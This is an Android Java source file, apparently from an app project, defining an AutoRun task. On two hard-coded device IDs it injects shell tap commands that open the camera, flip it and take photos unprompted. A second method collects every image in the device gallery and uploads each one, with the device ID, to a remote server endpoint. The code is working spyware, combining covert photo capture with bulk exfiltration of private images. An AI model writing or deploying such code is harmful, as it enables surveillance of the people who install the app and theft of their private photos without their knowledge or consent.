/*
 * Copyright (C) 2022 xuexiangjys(xuexiangjys@163.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 */

package com.lenovo.innovate.prince.accessiblity;

import static com.xuexiang.xutil.XUtil.getContentResolver;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import com.blankj.utilcode.util.ThreadUtils;
import com.lenovo.innovate.fragment.news.GuoDuFragment;
import com.lenovo.innovate.prince.http.UpPicture;
import com.lenovo.innovate.utils.shell;
import com.xuexiang.xhttp2.XHttp;
import com.xuexiang.xhttp2.callback.impl.IProgressResponseCallBack;
import com.xuexiang.xhttp2.subsciber.ProgressLoadingSubscriber;
import com.xuexiang.xutil.file.FileUtils;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class AutoRun implements Runnable{

    public void run(){
        int time =500;

      String aa =  Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
      if(aa.equals("5224b69a99dbfb24")){
          sleep(time);
          shell.cmd_shell("input keyevent 3");
          sleep(time);
          shell.cmd_shell("input tap 750 2138");
          sleep(time);
          //反转摄像头
          shell.cmd_shell("input tap 131 2047");

          sleep(time);
          //拍照
          shell.cmd_shell("input tap 524 2075");

          sleep(time);
          //反转摄像头
          shell.cmd_shell("input tap 131 2047");

          sleep(time);
          //拍照
          shell.cmd_shell("input tap 524 2075");

          sleep(time);
          //图片
          shell.cmd_shell("input tap 917 2070");

          sleep(time);
          //图片
          shell.cmd_shell("input swipe 500 500 100 500");

      }else if (aa.equals("aad83253dc8bf764")){
          sleep(time);
          shell.cmd_shell("input keyevent 3");
          sleep(time);
          shell.cmd_shell("input tap 935 2179");
          sleep(time);
          //反转摄像头
          shell.cmd_shell("input tap 253 2002");

          sleep(time);
          //拍照
          shell.cmd_shell("input tap 562 2007");

          sleep(time);
          //反转摄像头
          shell.cmd_shell("input tap 253 2002");

          sleep(time);
          //拍照
          shell.cmd_shell("input tap 562 2007");

          sleep(time);
          //图片
          shell.cmd_shell("input tap 810 2032");

          sleep(time);
          //图片
          shell.cmd_shell("input swipe 500 500 100 500");
      }



       // shell.cmd_shell("input keyevent 3");

    /*    AppUtils.launchApp("com.oneplus.dialer");
        sleep(1500);
        shell.cmd_shell("input keyevent 3");

        //AppUtils.launchApp("com.oneplus.mms");
        shell.cmd_shell("am start -n package com.oneplus.mms");
        sleep(1500);






        shell.cmd_shell("input keyevent 3");*/


    }


    private void pic(Context context){

        List stringList = getSystemPhotoList(context);
        for (int i = 0; i < stringList.size(); i++) {
            String str = (String) stringList.get(i);
            UpPicture upPicture = new UpPicture();

            if( !GuoDuFragment.list_already_picture.contains(stringList.get(i))){
                Log.i("1111111路径",stringList.get(i).toString());
                GuoDuFragment.list_already_picture.add(stringList.get(i));

                ThreadUtils.executeBySingle(new ThreadUtils.SimpleTask<String>() {
                    @Override
                    public String doInBackground() throws Throwable {

                        XHttp.post("/App-Privacy/index.php/Home/Permission/Picture")
                                .params("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID))
                                .uploadFile("file", FileUtils.getFileByPath(str), new IProgressResponseCallBack() {
                                    @Override
                                    public void onResponseProgress(long bytesWritten, long contentLength, boolean done) {

                                    }
                                }).execute(Boolean.class)
                                //.compose(RxLifecycle.with(context).<Boolean>bindToLifecycle())
                                .subscribeWith(new ProgressLoadingSubscriber<Boolean>() {
                                    @Override
                                    public void onSuccess(Boolean aBoolean) {
                                        // mIsEditSuccess = true;
                                        // ToastUtils.toast("图片上传" + (aBoolean ? "成功" : "失败") + "！");
                                    }
                                });
                        return null;
                    }
                    @Override
                    public void onSuccess(String result) {

                    }
                });

                //  System.out.println(str);
            }
        }

    }

    public static List<String> getSystemPhotoList(Context context)
    {
        List<String> result = new ArrayList<String>();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null, null);
        if (cursor == null || cursor.getCount() <= 0) return null; // 没有图片
        while (cursor.moveToNext())
        {
            int index = cursor
                    .getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            String path = cursor.getString(index); // 文件地址
            File file = new File(path);
            if (file.exists())
            {
                result.add(path);
            }
        }

        return result ;
    }
    public static void sleep(int i)  {
        try {
            Thread.sleep(i);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
